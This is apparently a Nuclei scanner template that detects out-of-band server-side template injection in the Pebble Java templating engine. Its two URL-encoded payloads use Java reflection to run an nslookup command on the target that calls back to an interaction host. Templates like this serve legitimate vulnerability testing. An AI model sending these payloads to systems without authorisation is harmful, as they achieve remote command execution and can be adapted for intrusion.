http:
- fuzzing:
  - fuzz:
    - '{{injection}}'
    mode: single
    part: query
    type: postfix
  matchers:
  - condition: and
    dsl:
    - contains(interactsh_protocol,'dns')
    - contains(interactsh_request,'srv')
    name: request-matcher
    type: dsl
  payloads:
    injection:
    - '{%25%20set%20cmd%20=%20%27nslookup%20-type=SRV%20{{interactsh-url}}%27%20%25}{%25%20set%20bytes%20%3D%20(1).TYPE.forName(%27java.lang.Runtime%27).methods%5B6%5D.invoke(null,null).exec(cmd).inputStream.readAllBytes()%20%25}{{%20(1).TYPE.forName(%27java.lang.String%27).constructors%5B0%5D.newInstance((%5Bbytes%5D).toArray())%20}}'
    - '{{%20variable.getClass().forName(%27java.lang.Runtime%27).getRuntime().exec(%27nslookup%20-type=SRV%20{{interactsh-url}}%27)%20}}'
  pre-condition:
  - dsl:
    - method == "GET"
    type: dsl
  skip-variables-check: true
id: pebble-oob
info:
  author: ritikchaddha
  description: 'Pebble is a Java templating engine inspired by Twig and similar to
    the Python Jinja Template Engine syntax. It features templates inheritance and
    easy-to-read syntax, ships with built-in autoescaping for security, and includes
    integrated support for internationalization.

    '
  metadata:
    max-request: 1
  name: Pebble - Out of Band Template Injection
  reference:
  - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Java.md#pebble---code-execution
  severity: high
  tags: ssti,dast,pebble,vuln
